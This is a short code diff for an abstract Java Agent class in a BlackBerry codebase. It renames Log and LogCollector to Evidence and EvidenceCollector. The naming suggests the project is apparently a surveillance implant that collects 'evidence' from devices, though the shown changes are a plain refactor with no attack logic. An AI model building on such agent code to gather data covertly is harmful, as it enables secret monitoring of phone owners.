@@ -11,8 +11,8 @@ package blackberry.agent;
 import blackberry.Status;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.log.Log;
-import blackberry.log.LogCollector;
+import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceCollector;
 import blackberry.threadpool.TimerJob;
 import blackberry.utils.Check;
 
@@ -185,7 +185,7 @@ public abstract class Agent extends TimerJob {
 
     Status status;
 
-    LogCollector logCollector;
+    EvidenceCollector logCollector;
 
     boolean logOnSD;
     public int agentId;
@@ -194,7 +194,7 @@ public abstract class Agent extends TimerJob {
 
     // public int command;
 
-    protected Log log;
+    protected Evidence evidence;
 
     /**
      * Instantiates a new agent.
@@ -212,12 +212,12 @@ public abstract class Agent extends TimerJob {
             final boolean logOnSD_, final String name) {
         super(name);
         status = Status.getInstance();
-        logCollector = LogCollector.getInstance();
+        logCollector = EvidenceCollector.getInstance();
 
         agentId = agentId_;
 
         logOnSD = logOnSD_;
-        log = logCollector.factory(this, logOnSD_);
+        evidence = logCollector.factory(this, logOnSD_);
 
         enable(agentEnabled);
     }
